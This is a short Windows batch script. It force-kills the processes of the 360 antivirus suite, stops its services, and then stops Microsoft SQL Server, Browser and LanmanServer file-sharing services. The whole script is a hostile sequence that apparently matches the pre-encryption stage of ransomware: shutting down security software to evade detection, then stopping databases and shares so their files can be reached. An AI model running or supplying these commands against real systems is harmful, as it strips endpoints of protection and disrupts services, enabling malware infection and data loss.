echo STOP 360 Services

taskkill /f /t /im ZhuDongFangYu.exe
taskkill /f /t /im 360sd.exe
taskkill /f /t /im 360rp.exe
taskkill /f /t /im 360tray.exe
taskkill /f /t /im 360leakfixer.exe
sc stop ZhuDongFangYu
sc stop 360rp

echo STOP MS Service

sc stop MSSQLSERVER
sc stop MSSQL$SQLEXPRESS
sc stop MSSQLServerOLAPService
sc stop msftesql
sc stop MsDtsServer
sc stop SQLWriter

sc stop Browser
echo wate a while
sc stop LanmanServer

echo END
